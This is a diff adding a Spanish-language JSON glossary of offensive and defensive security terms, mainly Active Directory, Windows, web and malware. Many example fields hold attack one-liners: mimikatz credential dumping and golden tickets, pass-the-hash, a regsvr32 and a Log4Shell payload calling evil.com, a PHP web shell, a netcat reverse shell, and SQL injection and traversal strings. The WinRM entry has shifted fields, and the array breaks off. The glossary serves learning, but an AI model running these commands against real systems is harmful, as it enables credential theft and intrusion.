@@ -1,0 +1,1343 @@
+[
+  {
+    "term": "Kerberoasting",
+    "acronym": "KRB-ROAST",
+    "definition": "Pedir tickets de servicio de cuentas con SPN y crackearlos offline",
+    "example": "GetUserSPNs.py -request → hashcat",
+    "category": "Active Directory",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "TryHackMe AD, OSCP, PNPT"
+  },
+  {
+    "term": "AS-REP Roasting",
+    "acronym": null,
+    "definition": "Ataque contra cuentas con \"pre-auth disabled\" para obtener tickets crackeables",
+    "example": "Rubeus asreproast /user:juan",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "TryHackMe, HackTheBox"
+  },
+  {
+    "term": "Golden Ticket",
+    "acronym": null,
+    "definition": "Ticket TGT falso con hash krbtgt → acceso total al dominio para siempre",
+    "example": "mimikatz \"kerberos::golden /admin:admin /domain:corp /sid:... /krbtgt:HASH\"",
+    "category": "Active Directory",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Pentest reales AD"
+  },
+  {
+    "term": "Silver Ticket",
+    "acronym": null,
+    "definition": "Ticket de servicio falso (no requiere krbtgt)",
+    "example": "mimikatz \"kerberos::golden /target:dc01 /service:cifs /rc4:NTLMHASH\"",
+    "category": "Active Directory",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "OSCP labs"
+  },
+  {
+    "term": "DC-Sync",
+    "acronym": null,
+    "definition": "Replicación forzada de todos los hashes del dominio",
+    "example": "mimikatz \"lsadump::dcsync /domain:corp /all\"",
+    "category": "Active Directory",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "BloodHound + ataques reales"
+  },
+  {
+    "term": "Pass-the-Hash",
+    "acronym": "PTH",
+    "definition": "Usar hash NTLM robado sin conocer contraseña",
+    "example": "psexec.py user@host -hashes lm:ntlm",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Redes antiguas Windows"
+  },
+  {
+    "term": "Living off the Land",
+    "acronym": "LotL",
+    "definition": "Usar herramientas legítimas del sistema para atacar",
+    "example": "powershell, wmic, certutil, rundll32",
+    "category": "Red Team",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "APT rusos/chinos"
+  },
+  {
+    "term": "LOLBins",
+    "acronym": null,
+    "definition": "Binarios legítimos de Windows usados para maldad",
+    "example": "regsvr32.exe /s /i:http://evil.com/shell.sct scrobj.dll",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Red Team y Blue Team"
+  },
+  {
+    "term": "C2",
+    "acronym": "Command & Control",
+    "definition": "Servidor del atacante donde el malware llama a casa",
+    "example": "Cobalt Strike, Covenant, Empire",
+    "category": "Malware",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "Todos los reportes"
+  },
+  {
+    "term": "Beaconing",
+    "acronym": null,
+    "definition": "Conexiones periódicas del malware al C2 (patrón detectable)",
+    "example": "Beacon Cobalt Strike cada 8 segundos",
+    "category": "Malware",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Threat Hunting"
+  },
+  {
+    "term": "SIEM",
+    "acronym": "Security Information and Event Management",
+    "definition": "Sistema centralizado de logs y alertas",
+    "example": "Splunk, Elastic, Sentinel",
+    "category": "Blue Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Security+, CySA+"
+  },
+  {
+    "term": "SOAR",
+    "acronym": "Security Orchestration Automation and Response",
+    "definition": "Automatización de respuestas a incidentes",
+    "example": "Cortex XSOAR, Splunk SOAR",
+    "category": "Blue Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "SOC nivel 2-3"
+  },
+  {
+    "term": "EDR",
+    "acronym": "Endpoint Detection and Response",
+    "definition": "Antivirus avanzado basado en comportamiento",
+    "example": "CrowdStrike, Defender for Endpoint",
+    "category": "Blue Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Empresas medianas"
+  },
+  {
+    "term": "XDR",
+    "acronym": "Extended Detection and Response",
+    "definition": "EDR + red + nube + correo",
+    "example": "Microsoft 365 Defender, Cortex XDR",
+    "category": "Blue Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Tendencia 2025"
+  },
+  {
+    "term": "LDAPS",
+    "acronym": null,
+    "definition": "LDAP sobre TLS/SSL (puerto 636)",
+    "example": "dc01.corp.local:636",
+    "category": "Active Directory",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Entornos reales"
+  },
+  {
+    "term": "BloodHound",
+    "acronym": null,
+    "definition": "Herramienta gráfica de ataque a Active Directory",
+    "example": "bloodhound.py -c all",
+    "category": "Active Directory",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Todo pentest AD"
+  },
+  {
+    "term": "Responder",
+    "acronym": null,
+    "definition": "Envenenamiento LLMNR/NBT-NS para robar hashes",
+    "example": "Responder -I eth0",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Redes sin DNS"
+  },
+  {
+    "term": "IDOR",
+    "acronym": "Insecure Direct Object Reference",
+    "definition": "Cambiar ID en URL y acceder a datos ajenos",
+    "example": "/user/123 → /user/456",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Bug Bounty"
+  },
+  {
+    "term": "SSRF",
+    "acronym": "Server-Side Request Forgery",
+    "definition": "Hacer peticiones desde el servidor",
+    "example": "http://169.254.169.254/latest/meta-data",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Cloud + Bug Bounty"
+  },
+  {
+    "term": "YARA",
+    "acronym": null,
+    "definition": "Lenguaje de reglas para identificar malware",
+    "example": "Reglas de Florian Roth",
+    "category": "Threat Hunting",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Blue Team avanzado"
+  },
+  {
+    "term": "MITRE ATT&CK",
+    "acronym": null,
+    "definition": "Framework de tácticas y técnicas de atacantes",
+    "example": "TA0001 → T1566 Phishing",
+    "category": "General",
+    "difficulty": "-",
+    "where_you_hear_it": "Todo el mundo"
+  },
+  {
+    "term": "TTP",
+    "acronym": "Tactics, Techniques and Procedures",
+    "definition": "Cómo actúa realmente un grupo APT",
+    "example": "APT29 = spear-phishing + Cobalt Strike",
+    "category": "General",
+    "difficulty": "-",
+    "where_you_hear_it": "Reportes inteligencia"
+  },
+  {
+    "term": "IOC",
+    "acronym": "Indicator of Compromise",
+    "definition": "Evidencia técnica de compromiso",
+    "example": "IP 185.117.118.123",
+    "category": "Blue Team",
+    "difficulty": "-",
+    "where_you_hear_it": "Forense"
+  },
+  {
+    "term": "Pivot",
+    "acronym": null,
+    "definition": "Usar máquina comprometida para atacar otras",
+    "example": "chisel, ligolo-ng, proxychains",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Redes segmentadas"
+  },
+  {
+    "term": "Web shell",
+    "acronym": null,
+    "definition": "Script que permite ejecutar comandos en servidor web",
+    "example": "<?php system($_GET['cmd']); ?>",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Web pentest"
+  },
+  {
+    "term": "ZeroLogon",
+    "acronym": "CVE-2020-1472",
+    "definition": "Resetear contraseña de DC sin autenticación",
+    "example": "zerologon.py DC01 10.10.10.10",
+    "category": "Vulnerabilidades",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Explotado 2020-2021"
+  },
+  {
+    "term": "Log4Shell",
+    "acronym": "CVE-2021-44228",
+    "definition": "RCE en Log4j vía JNDI",
+    "example": "${jndi:ldap://evil.com/a}",
+    "category": "Vulnerabilidades",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Bug más famoso 2021"
+  },
+  {
+    "term": "ProxyShell",
+    "acronym": null,
+    "definition": "Cadena de vulnerabilidades Exchange 2021",
+    "example": "ProxyLogon + ProxyShell + ProxyOracle",
+    "category": "Microsoft Exchange",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "2021-2022"
+  },
+  {
+    "term": "EternalBlue",
+    "acronym": "CVE-2017-0144",
+    "definition": "Explotación SMBv1 (WannaCry)",
+    "example": "ms17-010 exploit",
+    "category": "Windows",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "2017"
+  },
+  {
+    "term": "BlueKeep",
+    "acronym": "CVE-2019-0708",
+    "definition": "RDP RCE en Windows 2008-2019",
+    "example": "Exploit público 2019",
+    "category": "Windows",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "2019"
+  },
+  {
+    "term": "PrintNightmare",
+    "acronym": "CVE-2021-34527",
+    "definition": "Escalada de privilegios vía spooler",
+    "example": "Exploit público 2021",
+    "category": "Windows",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "2021"
+  },
+  {
+    "term": "Follina",
+    "acronym": "CVE-2022-30190",
+    "definition": "RCE vía MSDT en documentos Office",
+    "example": "docx malicioso",
+    "category": "Microsoft Office",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "2022"
+  },
+  {
+    "term": "PetitPotam",
+    "acronym": "NTLM Relay",
+    "definition": "Forzar autenticación NTLM contra DC",
+    "example": "petitpotam.py",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2021-2022"
+  },
+  {
+    "term": "Shadow Credentials",
+    "acronym": null,
+    "definition": "Crear certificado falso para autenticarse como máquina",
+    "example": "whisker.exe add /target:DC01$",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2023-2024"
+  },
+  {
+    "term": "NoPac",
+    "acronym": null,
+    "definition": "Combinación SamAccountName spoofing + privilegios",
+    "example": "nopac.py",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2021-2022"
+  },
+  {
+    "term": "PrintSpoofer",
+    "acronym": null,
+    "definition": "Abusar del servicio Print Spooler para escalar",
+    "example": "PrintSpoofer64.exe -i -c cmd",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2021-2023"
+  },
+  {
+    "term": "Juicy Potato",
+    "acronym": null,
+    "definition": "Abusar de privilegios SeImpersonate para escalar",
+    "example": "JuicyPotato.exe -l 1337 -p cmd.exe",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2019-2022"
+  },
+  {
+    "term": "Rotten Potato",
+    "acronym": null,
+    "definition": "Versión anterior de Juicy Potato",
+    "example": "rottenpotato.exe",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2016-2018"
+  },
+  {
+    "term": "God Potato",
+    "acronym": null,
+    "definition": "Versión moderna y estable de Potato exploits",
+    "example": "GodPotato.exe",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2022-2024"
+  },
+  {
+    "term": "Token Impersonation",
+    "acronym": null,
+    "definition": "Robar token de proceso con más privilegios",
+    "example": "incognito.exe, meterpreter getsystem",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Metasploit"
+  },
+  {
+    "term": "Relay Attack",
+    "acronym": "NTLM Relay",
+    "definition": "Ataque de relevo NTLM (Responder + ntlmrelayx)",
+    "example": "ntlmrelayx.py -t ldaps://dc01",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Red Team avanzado"
+  },
+  {
+    "term": "Overpass-the-Hash",
+    "acronym": null,
+    "definition": "Usar hash RC4 para obtener TGT",
+    "example": "asktgt.py /user:juan /rc4:NTLMHASH",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Impacket"
+  },
+  {
+    "term": "Unconstrained Delegation",
+    "acronym": null,
+    "definition": "Máquina permite que cualquiera use su TGS",
+    "example": "Set-ADUser -TrustedForDelegation $true",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "BloodHound"
+  },
+  {
+    "term": "Constrained Delegation",
+    "acronym": null,
+    "definition": "Delegación restringida a servicios específicos",
+    "example": "S4U2Self + S4U2Proxy",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Abusado en ataques"
+  },
+  {
+    "term": "Resource-Based Constrained Delegation",
+    "acronym": "RBCD",
+    "definition": "Máquina controla quién puede delegar en ella",
+    "example": "Set-ADObject -Add msDS-AllowedToActOnBehalfOfOtherIdentity",
+    "category": "Active Directory",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "2020-2024"
+  },
+  {
+    "term": "SAM Account Name Spoofing",
+    "acronym": null,
+    "definition": "Cambiar sAMAccountName para suplantar",
+    "example": "NoPac, PetitPotam",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2021-2022"
+  },
+  {
+    "term": "LAPS",
+    "acronym": "Local Administrator Password Solution",
+    "definition": "Gestión centralizada de contraseñas locales",
+    "example": "Microsoft LAPS",
+    "category": "Windows",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Entornos empresariales"
+  },
+  {
+    "term": "GPO",
+    "acronym": "Group Policy Object",
+    "definition": "Políticas de grupo en Active Directory",
+    "example": "GPO abuse (gpupdate /force)",
+    "category": "Active Directory",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Pentest AD"
+  },
+  {
+    "term": "Lateral Movement",
+    "acronym": null,
+    "definition": "Movimiento lateral dentro de la red",
+    "example": "PsExec, WMI, RDP, WinRM",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Todo pentest interno"
+  },
+  {
+    "term": "Persistence",
+    "acronym": null,
+    "definition": "Mantenimiento de acceso tras reinicio",
+    "example": "Scheduled Tasks, Registry Run keys, Services",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Todo ataque real"
+  },
+  {
+    "term": "Exfiltration",
+    "acronym": null,
+    "definition": "Extracción de datos",
+    "example": "DNS tunneling, HTTP POST, cloud storage",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Etapa final de ataque"
+  },
+  {
+    "term": "Command and Control",
+    "acronym": "C2",
+    "definition": "Comunicación con el atacante",
+    "example": "Cobalt Strike, Mythic",
+    "category": "Malware",
+    "difficulty": "Muy alto",
+    "where_you_hear_it": "Todo malware avanzado"
+  },
+  {
+    "term": "Phishing",
+    "acronym": null,
+    "definition": "Suplantación para robar credenciales",
+    "example": "Correo falso con enlace malicioso",
+    "category": "Ingeniería social",
+    "difficulty": "Alto",
+    "where_you_hear_it": "99% de los ataques"
+  },
+  {
+    "term": "Spear Phishing",
+    "acronym": null,
+    "definition": "Phishing dirigido a persona concreta",
+    "example": "Correo personalizado a CEO",
+    "category": "Ingeniería social",
+    "difficulty": "Alto",
+    "where_you_hear_it": "APT"
+  },
+  {
+    "term": "Whaling",
+    "acronym": null,
+    "definition": "Phishing contra altos ejecutivos",
+    "example": "CEO fraud, BEC",
+    "category": "Ingeniería social",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Crimen organizado"
+  },
+  {
+    "term": "Vishing",
+    "acronym": null,
+    "definition": "Phishing por voz",
+    "example": "Llamada fingiendo ser soporte técnico",
+    "category": "Ingeniería social",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Call centers"
+  },
+  {
+    "term": "Smishing",
+    "acronym": null,
+    "definition": "Phishing por SMS",
+    "example": "SMS con enlace malicioso",
+    "category": "Ingeniería social",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Cada vez más común"
+  },
+  {
+    "term": "Baiting",
+    "acronym": null,
+    "definition": "Dejar USB infectado en parking",
+    "example": "USB con malware",
+    "category": "Ingeniería social",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Ataques físicos"
+  },
+  {
+    "term": "Pretexting",
+    "acronym": null,
+    "definition": "Crear escenario falso para obtener información",
+    "example": "Fingir ser auditor",
+    "category": "Ingeniería social",
+    "difficulty": "Medio",
+    "where_you_hear_it": "OSINT + social"
+  },
+  {
+    "term": "Tailgating",
+    "acronym": null,
+    "definition": "Seguir a alguien con acceso físico",
+    "example": "Entrar detrás sin tarjeta",
+    "category": "Ingeniería social",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Ataques físicos"
+  },
+  {
+    "term": "Ransomware",
+    "acronym": null,
+    "definition": "Malware que encripta archivos y pide rescate",
+    "example": "LockBit, Conti, BlackCat",
+    "category": "Malware",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Noticia diaria"
+  },
+  {
+    "term": "Wiper",
+    "acronym": null,
+    "definition": "Malware que destruye datos (no pide rescate)",
+    "example": "NotPetya, WhisperGate",
+    "category": "Malware",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Ataques estatales"
+  },
+  {
+    "term": "Spyware",
+    "acronym": null,
+    "definition": "Malware que espía",
+    "example": "Keylogger, Pegasus",
+    "category": "Malware",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Espionaje"
+  },
+  {
+    "term": "Adware",
+    "acronym": null,
+    "definition": "Malware que muestra publicidad intrusiva",
+    "example": "Superfish, Fireball",
+    "category": "Malware",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Molesto pero común"
+  },
+  {
+    "term": "Trojan",
+    "acronym": null,
+    "definition": "Malware disfrazado de software legítimo",
+    "example": "Emotet, TrickBot",
+    "category": "Malware",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Distribución masiva"
+  },
+  {
+    "term": "Rootkit",
+    "acronym": null,
+    "definition": "Malware que se oculta en kernel",
+    "example": "TDL4, ZeroAccess",
+    "category": "Malware",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Muy difícil de detectar"
+  },
+  {
+    "term": "Bootkit",
+    "acronym": null,
+    "definition": "Rootkit que infecta el MBR/boot sector",
+    "example": "Stoned Bootkit",
+    "category": "Malware",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Rarísimo hoy"
+  },
+  {
+    "term": "Fileless Malware",
+    "acronym": null,
+    "definition": "Malware que vive solo en memoria",
+    "example": "PowerShell Empire, Kovter",
+    "category": "Malware",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Cada vez más común"
+  },
+  {
+    "term": "Polymorphic Malware",
+    "acronym": null,
+    "definition": "Malware que cambia su firma cada vez",
+    "example": "FickerStealer, QakBot",
+    "category": "Malware",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Evade AV"
+  },
+  {
+    "term": "Metamorphic Malware",
+    "acronym": null,
+    "definition": "Malware que reescribe su propio código",
+    "example": "Zmist, Simile",
+    "category": "Malware",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Casi extinto"
+  },
+  {
+    "term": "Backdoor",
+    "acronym": null,
+    "definition": "Puerta trasera para acceso remoto",
+    "example": "Netcat listener, ASPX shell",
+    "category": "Malware",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Post-explotación"
+  },
+  {
+    "term": "Reverse Shell",
+    "acronym": null,
+    "definition": "Shell donde víctima conecta al atacante",
+    "example": "nc -e /bin/bash attacker 443",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "TryHackMe básico"
+  },
+  {
+    "term": "Bind Shell",
+    "acronym": null,
+    "definition": "Shell donde atacante conecta a víctima",
+    "example": "nc -lvp 4444",
+    "category": "Red Team",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Raro en redes reales"
+  },
+  {
+    "term": "Web Shell",
+    "acronym": null,
+    "definition": "Shell PHP/ASP en servidor web",
+    "example": "weevely, b374k",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Web pentest"
+  },
+  {
+    "term": "SQL Injection",
+    "acronym": "SQLi",
+    "definition": "Inyección de código SQL en formularios",
+    "example": "' OR '1'='1",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OWASP Top 10"
+  },
+  {
+    "term": "Command Injection",
+    "acronym": null,
+    "definition": "Inyección de comandos del sistema",
+    "example": "; ls -la",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OWASP Top 10"
+  },
+  {
+    "term": "XSS",
+    "acronym": "Cross-Site Scripting",
+    "definition": "Robar cookies con <script>alert(document.cookie)</script>",
+    "example": null,
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OWASP Top 10"
+  },
+  {
+    "term": "CSRF",
+    "acronym": "Cross-Site Request Forgery",
+    "definition": "Cambiar contraseña sin que usuario sepa",
+    "example": null,
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OWASP Top 10"
+  },
+  {
+    "term": "LFI",
+    "acronym": "Local File Inclusion",
+    "definition": "../../etc/passwd",
+    "example": null,
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Web pentest"
+  },
+  {
+    "term": "RFI",
+    "acronym": "Remote File Inclusion",
+    "definition": "http://evil.com/shell.txt",
+    "example": null,
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Casi extinto"
+  },
+  {
+    "term": "Directory Traversal",
+    "acronym": null,
+    "definition": "Navegar fuera del directorio web",
+    "example": "../../../../etc/passwd",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "Open Redirect",
+    "acronym": null,
+    "definition": "Redirección abierta a sitio malicioso",
+    "example": "/redirect?url=https://evil.com",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Phishing"
+  },
+  {
+    "term": "Clickjacking",
+    "acronym": null,
+    "definition": "Engañar para hacer clic invisible",
+    "example": "iframe oculto sobre botón legítimo",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Antiguo pero vivo"
+  },
+  {
+    "term": "Insecure Deserialization",
+    "acronym": null,
+    "definition": "Deserialización de datos manipulados",
+    "example": "Java ysoserial, PHP unserialize",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "OWASP Top 10"
+  },
+  {
+    "term": "Race Condition",
+    "acronym": null,
+    "definition": "Condición de carrera en lógica de negocio",
+    "example": "Doblar gasto de cupón",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Bug Bounty"
+  },
+  {
+    "term": "Business Logic Flaw",
+    "acronym": null,
+    "definition": "Error en lógica de negocio",
+    "example": "Pagar -1€ y recibir dinero",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Bug Bounty avanzado"
+  },
+  {
+    "term": "Rate Limiting",
+    "acronym": null,
+    "definition": "Límite de peticiones por IP",
+    "example": "Bloquear fuerza bruta",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Buenas prácticas"
+  },
+  {
+    "term": "Brute Force",
+    "acronym": null,
+    "definition": "Fuerza bruta de contraseñas",
+    "example": "hydra, burp intruder",
+    "category": "Web",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Login forms"
+  },
+  {
+    "term": "Credential Stuffing",
+    "acronym": null,
+    "definition": "Usar credenciales filtradas",
+    "example": "haveibeenpwned + burp",
+    "category": "Web",
+    "difficulty": "Alto",
+    "where_you_hear_it": "99% de brechas"
+  },
+  {
+    "term": "Password Spraying",
+    "acronym": null,
+    "definition": "Probar pocas contraseñas contra muchos usuarios",
+    "example": "Password123! contra toda la empresa",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Muy efectivo"
+  },
+  {
+    "term": "Dictionary Attack",
+    "acronym": null,
+    "definition": "Ataque con diccionario de contraseñas",
+    "example": "rockyou.txt",
+    "category": "Red Team",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "Rainbow Table",
+    "acronym": null,
+    "definition": "Tabla precalculada de hashes",
+    "example": "ophcrack",
+    "category": "Windows",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Solo LM hashes"
+  },
+  {
+    "term": "John the Ripper",
+    "acronym": null,
+    "definition": "Herramienta de cracking",
+    "example": "john --wordlist=rockyou.txt hashes",
+    "category": "Cracking",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "Hashcat",
+    "acronym": null,
+    "definition": "Cracker más rápido del mundo",
+    "example": "hashcat -m 1000 hashes.txt rockyou.txt",
+    "category": "Cracking",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Estándar actual"
+  },
+  {
+    "term": "Mimikatz",
+    "acronym": null,
+    "definition": "Robar credenciales de memoria Windows",
+    "example": "mimikatz.exe \"sekurlsa::logonpasswords\"",
+    "category": "Windows",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Todo pentest Windows"
+  },
+  {
+    "term": "LaZagne",
+    "acronym": null,
+    "definition": "Robar contraseñas de navegadores y apps",
+    "example": "lazagne.exe all",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Post-explotación"
+  },
+  {
+    "term": "Rubeus",
+    "acronym": null,
+    "definition": "Herramienta .NET para ataques Kerberos",
+    "example": "Rubeus.exe triage",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Red Team AD"
+  },
+  {
+    "term": "PowerView",
+    "acronym": null,
+    "definition": "PowerShell para enumeración AD",
+    "example": "Get-NetDomainController",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "SharpHound",
+    "acronym": null,
+    "definition": "Colector de datos para BloodHound",
+    "example": "SharpHound.exe -c All",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Estándar actual"
+  },
+  {
+    "term": "CrackMapExec",
+    "acronym": "CME",
+    "definition": "Swiss army knife para pentest",
+    "example": "crackmapexec smb 10.10.10.0/24",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Diario en pentest"
+  },
+  {
+    "term": "Impacket",
+    "acronym": null,
+    "definition": "Librería Python para protocolos Windows",
+    "example": "secretsdump.py, psexec.py",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Estándar"
+  },
+  {
+    "term": "Evil-WinRM",
+    "acronym": null,
+    "definition": "WinRM shell con pass-the-hash",
+    "example": "evil-winrm -i 10.10.10.10 -u juan -H ntlmhash",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Post-explotación"
+  },
+  {
+    "term": "WinRM",
+    "acronym": null,
+    "definition": "Windows Remote Management",
+    "example": "Acceso remoto PowerShell",
+    "category": "Enter-PSSession",
+    "difficulty": "Windows",
+    "where_you_hear_it": "Medio"
+  },
+  {
+    "term": "PsExec",
+    "acronym": null,
+    "definition": "Ejecución remota de comandos (Sysinternals)",
+    "example": "psexec \\\\host cmd",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Clásico"
+  },
+  {
+    "term": "WMI",
+    "acronym": null,
+    "definition": "Windows Management Instrumentation",
+    "example": "wmic process call create",
+    "category": "Windows",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Lateral movement"
+  },
+  {
+    "term": "SMB",
+    "acronym": null,
+    "definition": "Server Message Block",
+    "example": "Protocolo de archivos Windows (puertos 445, 139)",
+    "category": "Windows",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Base de red Windows"
+  },
+  {
+    "term": "RPC",
+    "acronym": null,
+    "definition": "Remote Procedure Call",
+    "example": "Protocolo Windows (puerto 135)",
+    "category": "Windows",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Base de muchos servicios"
+  },
+  {
+    "term": "Kerberos",
+    "acronym": null,
+    "definition": "Protocolo de autenticación de Windows",
+    "example": "Puertos 88, tickets TGT/TGS",
+    "category": "Active Directory",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Corazón de AD"
+  },
+  {
+    "term": "NTLM",
+    "acronym": null,
+    "definition": "NT LAN Manager",
+    "example": "Autenticación Windows antigua",
+    "category": "Windows",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Fallback de Kerberos"
+  },
+  {
+    "term": "LDAP",
+    "acronym": null,
+    "definition": "Lightweight Directory Access Protocol",
+    "example": "Protocolo de directorio (puerto 389)",
+    "category": "Active Directory",
+    "difficulty": "Medio",
+    "where_you_hear_it": "Consultas AD"
+  },
+  {
+    "term": "DNS Tunneling",
+    "acronym": null,
+    "definition": "Túnel de datos sobre DNS",
+    "example": "dnscat2, iodine",
+    "category": "Exfiltración",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Evade firewalls"
+  },
+  {
+    "term": "Cobalt Strike",
+    "acronym": null,
+    "definition": "Framework Red Team comercial",
+    "example": "Beacon, Malleable C2",
+    "category": "Red Team",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "Estándar industria"
+  },
+  {
+    "term": "Metasploit",
+    "acronym": null,
+    "definition": "Framework de explotación",
+    "example": "msfconsole, meterpreter",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Aprendizaje"
+  },
+  {
+    "term": "Empire",
+    "acronym": null,
+    "definition": "Framework PowerShell post-explotación",
+    "example": "stager, listener",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2015-2020"
+  },
+  {
+    "term": "Covenant",
+    "acronym": null,
+    "definition": "Framework .NET moderno",
+    "example": "Covenant.exe",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2020-2023"
+  },
+  {
+    "term": "Sliver",
+    "acronym": null,
+    "definition": "C2 multiplataforma en Go",
+    "example": "sliver-server, implant",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "2022-actualidad"
+  },
+  {
+    "term": "Brute Ratel",
+    "acronym": null,
+    "definition": "C2 avanzado (anti-EDR)",
+    "example": "Badger",
+    "category": "Red Team",
+    "difficulty": "Crítico",
+    "where_you_hear_it": "APT-like"
+  },
+  {
+    "term": "PoshC2",
+    "acronym": null,
+    "definition": "C2 en PowerShell",
+    "example": "PoshC2 server",
+    "category": "Red Team",
+    "difficulty": "Alto",
+    "where_you_hear_it": "Reino Unido"
+  },
+  {
